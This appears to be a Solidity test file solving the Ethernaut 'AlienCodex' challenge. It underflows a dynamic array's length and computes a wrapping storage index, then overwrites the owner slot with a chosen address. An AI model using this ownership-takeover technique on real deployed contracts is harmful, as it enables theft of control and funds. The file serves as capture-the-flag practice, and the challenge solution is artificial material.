// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.5.0;

import {AlienCodex} from "../src/aliencodex/AlienCodex.sol";
import {account} from "../src/account.sol";


contract AlienCodexTest {
    AlienCodex public sc;

    function test_Hack() public {
        sc = new AlienCodex();
        assertEq(sc.owner(), address(this));
        sc.makeContact();
        // 允许手动改变动态数组长度
        sc.retract();
        sc.revise(calSlotIndex(), bytes32(uint256(uint160(0x3959Aee07B31d67D1aC13516853999A497AF5c89))));
        assertEq(sc.owner(), 0x3959Aee07B31d67D1aC13516853999A497AF5c89);
    }

    function calSlotIndex() private pure returns(uint256) {
        uint256 slot0 = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 L = 0;
        return (L - 1) - slot0 + 1;
    }

    function assertEq(address a, address b) private pure {
        if (a != b) {
            //string memory message = string(abi.encodePacked("left:", addressToString(a), "right:", addressToString(b)));
            revert("failed");
        }
    }

    /* function addressToString(address _address) public pure returns (string memory) {
        bytes memory data = abi.encodePacked(_address);
        bytes memory alphabet = "0123456789abcdef";
        bytes memory str = new bytes(42);

        str[0] = '0';
        str[1] = 'x';

        for (uint i = 0; i < 20; i++) {
            str[2+i*2] = alphabet[uint(uint8(data[i + 12] >> 4))];
            str[3+i*2] = alphabet[uint(uint8(data[i + 12] & 0x0f))];
        }

        return string(str);
    } */
}
